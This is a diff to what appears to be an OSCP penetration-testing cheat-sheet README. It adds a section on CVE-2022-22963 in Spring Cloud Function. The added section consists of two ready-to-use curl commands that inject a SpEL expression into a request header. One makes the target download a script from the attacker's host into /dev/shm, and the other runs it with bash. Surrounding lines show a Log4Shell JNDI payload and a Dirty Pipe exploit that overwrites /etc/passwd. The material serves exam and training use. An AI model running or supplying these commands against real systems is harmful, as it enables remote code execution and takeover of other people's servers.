@@ -156,6 +156,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/OSCP#cve-2021-3156-sudo--sudoedit-lpe)
 		- [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2021-44228-log4shell-rce-0-day)
 		- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/OSCP#cve-2022-0847-dirty-pipe-lpe)
+		- [CVE-2022-22963: Spring4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2022-22963-spring4shell-rce-0-day)
 		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
 		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
@@ -3915,6 +3916,18 @@ curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Explo
 gcc -o dirtypipe dirtypipe.c
 ./dirtypipe /etc/passwd 1 ootz:
 su rootz
+```
+
+#### CVE-2022-22963: Spring4Shell RCE (0-day)
+
+> https://github.com/me2nuk/CVE-2022-22963
+
+```c
+$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
+```
+
+```c
+$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
 #### CVE-2022-30190: MS-MSDT Follina RCE
